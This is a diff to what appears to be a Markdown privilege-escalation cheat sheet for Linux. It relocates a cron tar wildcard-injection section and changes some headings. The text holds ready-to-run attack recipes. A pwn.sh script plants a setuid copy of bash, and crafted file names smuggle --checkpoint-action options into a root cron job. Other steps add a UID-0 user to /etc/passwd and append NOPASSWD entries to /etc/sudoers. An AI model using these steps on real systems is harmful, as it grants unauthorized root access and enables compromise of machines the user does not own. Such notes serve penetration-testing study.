@@ -752,7 +752,39 @@ The two perl binaries stand out as they have setuid capabilities enabled, along 
 crontab -l
 ls -al /etc/cron*
 ```
-###### Insecure file permission /etc/passwd
+###### Cron using a script with a wildcard (Wildcard Injection)
+```
+[root@RedHat_test ~]# man tar
+ -c新建打包文件，同 -v一起使用 查看过程中打包文件名
+ -v压缩或解压过程中，显示过程
+ -f要操作的文件名
+ -r表示增加文件，把要增加的文件追加在压缩文件的末尾
+ -t表示查看文件，查看文件中的文件内容
+ -x解压文件
+ -z通过gzip方式压缩或解压，最后以.tar.gz 为后缀
+ -j通过bzip2方式压缩或解压，最后以.tar.br2 为后缀。压缩后大小小于.tar.gz
+ -u更新压缩文件中的内容
+ -p保留绝对路径，即允许备份数据中含有根目录
+ -P保留数据原来权限及属性
+```
+```
+CronJob:
+*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
+
+Solution:
+cd /opt/admin
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > \
+/opt/admin/pwn.sh
+touch /opt/admin/--checkpoint=1
+touch /opt/admin/--checkpoint-action=exec=sh\ pwn.sh
+touch /tmp/backup.tar.gz
+
+/tmp/bash -p
+
+The Actual Bash Interpretation:
+/opt/admin: tar -zxf /tmp/backup.tar.gz --checkpoint-action=exec=sh pwn.sh  --checkpoint=1  pwn.sh
+```
+### Insecure file permission /etc/passwd
  ```
  1. check if users have write permission
  2. openssl passwd evil:
@@ -761,7 +793,7 @@ openssl passwd -1 -salt hack password123
  3. echo "root2:$1$eWmYOQrX$UHeqHr4pKVFfx1rrFK05B1:0:0:root:/root:/bin/bash" >> /etc/passwd
  4. su root2, enter passwd as evil
  ```
-###### Writable /etc/sudoers
+### Writable /etc/sudoers
 ```
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
 echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
@@ -852,35 +884,4 @@ check zip,gz,7z,stix,rar files
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-###### Cron using a script with a wildcard (Wildcard Injection)
-```
-[root@RedHat_test ~]# man tar
- -c新建打包文件，同 -v一起使用 查看过程中打包文件名
- -v压缩或解压过程中，显示过程
- -f要操作的文件名
- -r表示增加文件，把要增加的文件追加在压缩文件的末尾
- -t表示查看文件，查看文件中的文件内容
- -x解压文件
- -z通过gzip方式压缩或解压，最后以.tar.gz 为后缀
- -j通过bzip2方式压缩或解压，最后以.tar.br2 为后缀。压缩后大小小于.tar.gz
- -u更新压缩文件中的内容
- -p保留绝对路径，即允许备份数据中含有根目录
- -P保留数据原来权限及属性
-```
-```
-CronJob:
-*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
 
-Solution:
-cd /opt/admin
-echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > \
-/opt/admin/pwn.sh
-touch /opt/admin/--checkpoint=1
-touch /opt/admin/--checkpoint-action=exec=sh\ pwn.sh
-touch /tmp/backup.tar.gz
-
-/tmp/bash -p
-
-The Actual Bash Interpretation:
-/opt/admin: tar -zxf /tmp/backup.tar.gz --checkpoint-action=exec=sh pwn.sh  --checkpoint=1  pwn.sh
-```
